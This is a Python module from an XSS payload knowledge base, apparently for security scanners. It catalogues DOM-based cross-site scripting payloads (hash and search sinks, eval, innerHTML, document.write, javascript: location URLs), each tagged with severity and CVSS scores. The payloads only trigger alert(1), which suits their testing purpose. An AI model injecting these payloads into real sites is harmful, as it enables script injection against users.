#!/usr/bin/env python3
"""
Project: BRS-KB (BRS XSS Knowledge Base)
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-12-26 UTC
Status: Refactored
Telegram: https://t.me/EasyProTech

DOM-based XSS Payloads
"""

from ..models import PayloadEntry


REFLECTED_DOM_PAYLOADS = {
    "rdom_1": PayloadEntry(
        payload="<script>document.write(location.hash.slice(1))</script>#<img src=x onerror=alert(1)>",
        contexts=["html_content", "javascript"],
        severity="high",
        cvss_score=7.5,
        description="DOM XSS via location.hash",
        tags=["dom", "reflected", "hash"],
        reliability="high",
    ),
    "rdom_2": PayloadEntry(
        payload="<script>document.write(decodeURIComponent(location.search))</script>?<img src=x onerror=alert(1)>",
        contexts=["html_content", "javascript"],
        severity="high",
        cvss_score=7.5,
        description="DOM XSS via location.search",
        tags=["dom", "reflected", "search"],
        reliability="high",
    ),
    "rdom_3": PayloadEntry(
        payload="<script>var x=location.href.split('#')[1];document.getElementById('x').innerHTML=x</script>",
        contexts=["javascript"],
        severity="high",
        cvss_score=7.5,
        description="DOM XSS innerHTML from hash",
        tags=["dom", "reflected", "innerHTML"],
        reliability="high",
    ),
    "rdom_4": PayloadEntry(
        payload="<script>eval(location.hash.slice(1))</script>#alert(1)",
        contexts=["html_content", "javascript"],
        severity="critical",
        cvss_score=9.0,
        description="DOM XSS eval from hash",
        tags=["dom", "reflected", "eval", "hash"],
        reliability="high",
    ),
    "rdom_5": PayloadEntry(
        payload="<script>$.get(location.hash.slice(1))</script>#/api?callback=alert(1)//",
        contexts=["html_content", "javascript"],
        severity="critical",
        cvss_score=8.5,
        description="DOM XSS via jQuery.get JSONP",
        tags=["dom", "reflected", "jquery", "jsonp"],
        reliability="medium",
    ),
}

REFLECTED_DOM_PAYLOADS_TOTAL = len(REFLECTED_DOM_PAYLOADS)


DOCUMENT_PAYLOADS = {
    "doc_write": PayloadEntry(
        payload="<script>document.write('<img src=x onerror=alert(1)>')</script>",
        contexts=["html_content"],
        severity="critical",
        cvss_score=8.5,
        description="document.write",
        tags=["document", "write"],
        reliability="high",
    ),
    "doc_writeln": PayloadEntry(
        payload="<script>document.writeln('<img src=x onerror=alert(1)>')</script>",
        contexts=["html_content"],
        severity="critical",
        cvss_score=8.5,
        description="document.writeln",
        tags=["document", "writeln"],
        reliability="high",
    ),
    "doc_open": PayloadEntry(
        payload="<script>var d=document.open();d.write('<script>alert(1)<\\/script>');d.close()</script>",
        contexts=["html_content"],
        severity="critical",
        cvss_score=8.5,
        description="document.open/write/close",
        tags=["document", "open"],
        reliability="high",
    ),
    "doc_createElement": PayloadEntry(
        payload="<script>var s=document.createElement('script');s.text='alert(1)';document.body.appendChild(s)</script>",
        contexts=["html_content"],
        severity="critical",
        cvss_score=8.5,
        description="createElement script",
        tags=["document", "createElement"],
        reliability="high",
    ),
    "doc_body_innerHTML": PayloadEntry(
        payload="<script>document.body.innerHTML='<img src=x onerror=alert(1)>'</script>",
        contexts=["html_content"],
        severity="critical",
        cvss_score=8.5,
        description="body.innerHTML",
        tags=["document", "innerHTML"],
        reliability="high",
    ),
    "doc_body_outerHTML": PayloadEntry(
        payload="<script>document.body.outerHTML='<body><img src=x onerror=alert(1)></body>'</script>",
        contexts=["html_content"],
        severity="critical",
        cvss_score=8.5,
        description="body.outerHTML",
        tags=["document", "outerHTML"],
        reliability="high",
    ),
    "doc_body_insertAdjacentHTML": PayloadEntry(
        payload="<script>document.body.insertAdjacentHTML('beforeend','<img src=x onerror=alert(1)>')</script>",
        contexts=["html_content"],
        severity="critical",
        cvss_score=8.5,
        description="insertAdjacentHTML",
        tags=["document", "insertAdjacentHTML"],
        reliability="high",
    ),
    "doc_execCommand": PayloadEntry(
        payload="<script>document.execCommand('insertHTML',false,'<img src=x onerror=alert(1)>')</script>",
        contexts=["html_content"],
        severity="critical",
        cvss_score=8.5,
        description="execCommand insertHTML",
        tags=["document", "execCommand"],
        reliability="medium",
    ),
}

LOCATION_PAYLOADS = {
    "loc_href": PayloadEntry(
        payload="<script>location.href='javascript:alert(1)'</script>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="location.href javascript",
        tags=["location", "href"],
        reliability="medium",
    ),
    "loc_assign": PayloadEntry(
        payload="<script>location.assign('javascript:alert(1)')</script>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="location.assign javascript",
        tags=["location", "assign"],
        reliability="medium",
    ),
    "loc_replace": PayloadEntry(
        payload="<script>location.replace('javascript:alert(1)')</script>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="location.replace javascript",
        tags=["location", "replace"],
        reliability="medium",
    ),
    "loc_hash": PayloadEntry(
        payload="<script>location='#';onhashchange=alert</script>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="hashchange trigger",
        tags=["location", "hash", "hashchange"],
        reliability="high",
    ),
}
